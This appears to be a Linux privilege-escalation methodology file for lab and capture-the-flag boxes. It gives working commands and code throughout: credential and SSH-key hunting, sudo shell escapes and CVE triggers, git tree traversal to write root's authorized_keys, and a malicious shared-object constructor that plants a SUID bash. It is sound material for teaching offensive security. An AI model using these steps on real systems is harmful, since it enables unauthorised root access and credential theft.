# Linux privilege escalation

Enumerate manually first — the checks below take 60 seconds and find the
intended path most of the time. Run linpeas as a backstop, not as step one; its
output is long and easy to drown in.

## Manual sweep

```bash
id; sudo -l
uname -a; cat /etc/os-release
cat /etc/passwd | grep -v nologin
ls -la /home/*; ls -la ~
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # capabilities
cat /etc/crontab; ls -la /etc/cron.*
ps aux --forest | head -60
netstat -tulpn 2>/dev/null || ss -tulpn            # internal-only services
find / -writable -type d 2>/dev/null | grep -v proc | head
```

Credential hunting:
```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /opt /home /etc 2>/dev/null | grep -v Binary | head -50
ls -la /var/backups /tmp /opt
cat ~/.bash_history; cat ~/.ssh/id_*
find / -name '*.kdbx' -o -name '.env' -o -name 'config.php' -o -name 'wp-config.php' 2>/dev/null
```

## sudo -l

The single highest-yield check. Any allowed binary → look it up on GTFOBins:
```
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile      # then !/bin/sh
```
`env_keep+=LD_PRELOAD` present → compile a shared object with a `_init` that
spawns a shell, then `sudo LD_PRELOAD=/tmp/x.so <anything>`. `LD_LIBRARY_PATH`
kept works the same way with a fake `libc`.
Wildcards in a sudo rule (`sudo /bin/tar -czf /tmp/x /var/www/*`) → checkpoint
injection or filename-as-argument tricks.

**A trailing `*` grants the binary's entire *flag* surface, not just its
operands.** Read the rule the way `sudo` implements it, not the way its author
meant it: everything after the fixed prefix is yours, so any option the binary
accepts is in scope — including options that change *what privilege the work runs
with*. Rules of this shape look restrictive and are usually equivalent to root.
Take the allowed prefix, read the binary's `--help`, and ask which flag changes
the security context rather than the output:

- container runtimes — `--privileged`, `-u 0`, `--cap-add`, `-v /:/host`,
  `--pid=host` (a `docker exec *` rule is root: `--privileged` gives the exec'd
  process the full capability set, and with `CAP_SYS_ADMIN` plus the host's block
  devices visible in the container you `mount /dev/sdaN /mnt/h` and read/write
  the host filesystem, or `chroot` it for a shell — see `containers.md`)
- anything with `-o`/`--output`/`--config`/`-f` — write as root, or load a config
  that loads code (`httpd -f`, `rsync --rsync-path`, `tar --to-command`)
- interpreters and multiplexers — `-e`, `-c`, `--exec`, `--eval`, `-C <dir>`

The escalation here is a *documented feature* of the allowed binary, so nothing
looks anomalous. When you write it up, name the wildcard as the vulnerability,
not the runtime.
`(ALL, !root)` in older sudo → CVE-2019-14287, `sudo -u#-1 /bin/bash`.
Sudo `< 1.9.5p2` → Baron Samedit (CVE-2021-3156), a heap overflow reachable with
**no sudo rights at all** (`sudoedit -s '\' $(perl -e 'print "A"x1000')` to
confirm it segfaults). `sudo -l` needing no password after you already ran one →
a live sudo token you can reuse.
Sudo `1.9.14`–`1.9.17` → chroot NSS load (CVE-2025-32463), also reachable with
**no sudo rule at all** — `sudo -R <evil_chroot> <cmd>` loads
`libnss_/<svc>.so.2` from a chroot you control before authorization runs. But the
upstream version string lies: a distro can backport the fix and keep the number,
so **pin the package version** (`dpkg -l sudo` / `rpm -q sudo`), not `sudo -V`. A
suffix like `1.9.15p5-3ubuntu5.24.04.2` is the patched security update and the
exploit fails cleanly — verify empirically before spending time. When you do
build the NSS module, compile it with `-nostdlib` and raw `syscall`s so it carries
no glibc-version symbols and `dlopen` works across target glibc versions.

Quick classes the sweep already surfaced:
- **Writable `/etc/passwd`** → add a root-uid user with a known hash
  (`openssl passwd -1`), `su` to it. Writable `/etc/shadow` → same idea.
- **PATH hijack** → a root cron/SUID/script calling a bare command (`tar`, not
  `/bin/tar`) with a PATH you can prepend → drop a malicious `tar` first in PATH.
- **PwnKit (CVE-2021-4034)** — `pkexec` present and SUID is the give-away; a
  config bug, not a kernel bug, so it's safe to try early on older images.
- **polkit/D-Bus** → `busctl list` for services running as root that expose a
  method you can call (e.g. `CreateUser`, package-install actions). A root daemon
  reachable by any local user over the system bus is a privesc surface even with
  no group or sudo right: the classes are a permissive polkit rule (a method that
  returns `yes`/`auth_admin_keep` for `unix-user:*`), an argument-injection into
  what the daemon runs, and a **TOCTOU race** where a "safe" call authorises and a
  second call swaps in a dangerous payload before the check resolves. A
  *package-manager* daemon (PackageKit `InstallFiles`, `packagekitd`) is the
  highest-value target because "install a package as root" is arbitrary code via a
  maintainer script — so a version-gated CVE there beats any kernel bug. The
  install pattern is one-line: a `.deb` whose `postinst` (or `.rpm` `%post`) does
  `install -m 4755 /bin/bash /var/tmp/.x`, then `bash -p`. Prereqs to check on the
  target before building: `python3-gi` (the D-Bus client), `dpkg-deb`/`rpmbuild`,
  and a drop dir with neither `nosuid` nor `noexec` (`/dev/shm` is usually
  `nosuid`; `/var/tmp` usually is not). *(snapped: PackageKit `InstallFiles`
  SIMULATE→NONE flag race, CVE-2026-41651)*

## SUID / capabilities

Compare the SUID list against a stock system — anything unusual is the path.

**Pin the version of an unusual SUID binary before deciding it is uninteresting.**
GTFOBins entries are frequently *version-conditional*: a tool acquires a scripting
or interactive mode, it gets abused, and upstream removes it in a later release.
So the binary on a modern box is inert while the identically-named one on an old
box is a one-command root. `ls -la` it for the mode, then run its `--version`.
Look for any subcommand that hands a string to `system()`: an interactive prompt
with a `!`/`shell` escape, an embedded scripting engine, a `--exec`/`-o` hook, a
config file that names a program to run. Most such modes read stdin, so they
weaponise non-interactively with `echo "<escape> <cmd>" | binary <mode>` — which
matters when your foothold is a synchronous exec primitive with no TTY.

Confirm you actually crossed the boundary before celebrating: `uid` non-zero with
`euid=0` is the signature of a setuid binary rather than a login, and some
payloads need `bash -p` to keep the euid.
*(lame: `/usr/bin/nmap` 4.53 mode 4755 — `--interactive` plus its `!` escape,
removed upstream in 5.20; two `echo | nmap --interactive` lines made a setuid
shell)*

GTFOBins again for the standard binaries. `cap_setuid+ep` on python/perl:
```bash
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Cron, timers and custom scripts

```bash
./pspy64                                    # jobs /etc/crontab does not list
systemctl list-timers --all --no-pager      # systemd timers are not in crontab
ls -la /etc/cron.d /etc/cron.*/ /etc/systemd/system/*.service
```
A root cron running a script you can write, or running a relative path with a
writable PATH component, is a direct win. Also check for `tar`/`rsync`
wildcards in cron commands.

**A suggestive directory is not a vulnerability until you find its consumer.** A
non-default world-writable (often setgid) directory owned by a service group is
exactly the shape of a "root job ingests files you can drop here" privesc, and it
will pull you in. Before spending time on it, *prove something reads it*: grep
`/etc`, all unit files and `.path` watchers for the path, `grep -rl` the path
across binaries in `/usr/local`,`/usr/bin`,`/opt`, check for an open handle
(`ls -l /proc/*/fd | grep <dir>`), and drop a canary and watch it with `pspy` — if
nothing touches it in a few minutes it is a decoy, park it and move on. Match the
`pspy` interval to the suspected job; a 60 s window misses a 2–3 min cron, so
watch for 2–3× the longest plausible period before concluding "no job".

**Read any custom script you can, even when you cannot write it.** A
world-readable script run by root is worth more than a config file you cannot
read, because it tells you what root does with data you might control. Work
through it asking: where does its input come from, and can I influence that
input? Check the unit for `User=` and the log file's owner to confirm what it
runs as:

```bash
cat /etc/systemd/system/<name>.service | grep -E 'User=|ExecStart='
ls -la /var/log/<name>.log
```

The recurring bug class is a root job joining an attacker-influenced name onto a
directory:

```python
target = os.path.join(base_dir, name_from_untrusted_source)   # no containment check
```

`os.path.join` does not normalise `..`, and it *discards* `base_dir` entirely if
the second argument is absolute. Anything that feeds it filenames from a
database, an API response, an archive, or a git tree is a candidate for
arbitrary file write as root. Useful targets, in order of cleanliness:
`/root/.ssh/authorized_keys` (additive, reversible), a file in `/etc/cron.d`
(needs mode 0644), a script in `/etc/cron.hourly` (needs the execute bit).

Note that `git` is a common untrusted source here — and that git's own
restrictions are a porcelain behaviour, not a format one. `git add` refuses a
path containing `..`, but tree objects are just name-to-hash maps and
`git mktree` writes them directly:

```bash
BLOB=$(cat payload | git hash-object -w --stdin)
T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T=$(printf '040000 tree %s\t.ssh\n' "$T" | git mktree)
T=$(printf '040000 tree %s\troot\n' "$T" | git mktree)
for i in $(seq 1 5); do T=$(printf '040000 tree %s\t..\n' "$T" | git mktree); done
C=$(echo x | git commit-tree "$T"); git update-ref refs/heads/main "$C"
git ls-tree -r HEAD     # verify the path the consumer will see
```

Count the `..` levels against the consumer's base directory, and confirm with
`git ls-tree -r` before pushing. Forges do not fsck incoming objects by default,
so such a tree usually survives a push.

A second recurring class in these root scripts is a command *rebuilt from a
process's own command line*. A health-check or supervisor that does

```bash
while read pid cmdline; do cmd="${cmdline/foo/foo-variant} -flag"; $cmd; done \
  <<< "$(pgrep -lfa '^/opt/app/bin/foo ')"
```

runs `$cmd` unquoted as root, and *you* control `cmdline` — any local user can
launch a process with an arbitrary command line. Set it with `exec -a` so
`/proc/<pid>/cmdline` matches the `pgrep` pattern and appends the arguments you
want executed; use a do-nothing `int main(){for(;;)pause();}` binary as the exec
target so there is no trailing argv junk:

```bash
setsid bash -c 'exec -a "/opt/app/bin/foo --serve -d /opt/app/conf -f /tmp/eve.conf" /tmp/forever' &
```

Supervisors are the common host: `monit` `check program` runs its script as root
each cycle — read `/etc/monit/conf.d/*` (world-readable) and query the UI
(`curl -u admin:monit http://127.0.0.1:2812/_status`) to see which checks are
*active* before building anything. The lesson generalises past this exact sink:
any root job that turns `ps`/`pgrep` output back into a command is injectable.

When the injected command is a web/app server run in a *config-test* mode, the
test still loads modules — `httpd -t` / `apachectl -t` processes `LoadModule`, so
it `dlopen`s the named `.so` and runs its constructor as root. Weaponise by
injecting `-f <your.conf>` (single-token args survive the unquoted word-split)
pointing at a one-line `LoadModule x /tmp/e.so`; the `.so` is just

```c
__attribute__((constructor)) void go(void){ system("cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb"); }
```

Compile natively on-target (`gcc -shared -fPIC -nostartfiles`), then `/tmp/.rb -p`.
The constructor fires during the dlopen, before any "not a real module" error.

## Services and internal ports

Something listening on 127.0.0.1 that is not exposed externally is usually
where the escalation lives — an unauthenticated admin panel, a Redis, a
database. Forward it out (see `references/pivoting.md`) and attack it.

**Map each localhost port to its owning UID before assuming it's harmless.**
`ps` may hide other users' processes (`hidepid`), but `/proc/net/tcp` still lists
every listener with its socket owner:
`awk 'NR>1{split($2,a,":"); print strtonum("0x"a[2]), $8}' /proc/net/tcp | sort -nu`
(field 8 = UID). A stack of "media"/"monitoring" daemons all owned by **UID 0**
is the tell: any command sink in one of them is a *root* command sink, not a
service-user one. Rank these by "runs as root" before "looks exploitable".

**A root daemon whose auth secret is a readable file is pre-authenticated for
you.** Web/agent daemons commonly sign requests or check a token; read the
verifier before trying to crack anything. Two recurring own-goals turn the
"secret" into a public value:
- the stored credential *is already the hash*, and the code accepts that stored
  value **as the signing key** — so possession of the world-readable hash (no
  crack) forges valid admin requests;
- an inter-node/cluster token doubles as a full API bypass when replayed.

Then look for the config-as-command-sink: a field the (now-authenticated) admin
API writes into the daemon's own config that later runs as a shell command —
event hooks, notification "run a command", `on_*`/`ExecStart*`. Set it, then find
the daemon's *own* synchronous trigger (a webcontrol `action/…`, a "test",
`emulate`) so you don't wait on a natural event. Class example: a root-owned
CCTV/monitoring UI where the request signature key is the readable admin-password
hash and a "command notification" field is appended to the capture daemon's
`on_event_start`. Pin the version, read the verifier and the config mapping,
choose the sink — never memorise one product's recipe.

## Password reuse

Every password you have found, tried against every user in `/etc/passwd`, plus
`su`. This resolves a large fraction of lab boxes and costs nothing.

## Containers

If `/.dockerenv` exists, the cgroup shows docker/lxc, or `hostname` is a short
hex — you're in a container, and "root" here is not the host. The escape is
usually a mounted socket or an over-broad capability, not a kernel bug. Full
escape catalog (docker.sock, privileged, `CAP_SYS_ADMIN` release_agent,
`SYS_PTRACE`, `SYS_MODULE`, host mounts, `/proc` tricks) is in
**`references/containers.md`**.

If there is a Kubernetes service account (`/var/run/secrets/kubernetes.io/…`) or
the host runs a cluster (k3s/kubeadm/microk8s), the container is usually one step
of a larger chain — enumerate the SA's RBAC and the kubelet before reaching for a
local exploit. See `references/kubernetes.md`.

## Kernel exploits — last resort

Only when enumeration is genuinely exhausted. They crash lab boxes and
demonstrate nothing interesting. If you must: match the exact kernel version,
prefer a well-reviewed PoC (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034,
Dirty COW on ancient boxes), and note that PwnKit is a `pkexec` misconfiguration
rather than a kernel bug — check for it early, it is common on older lab images.

## Confirm and record

```bash
id                  # uid=0(root)
cat /root/root.txt
```
Write the escalation vector and its evidence file into FINDINGS.md before
moving on to the report.
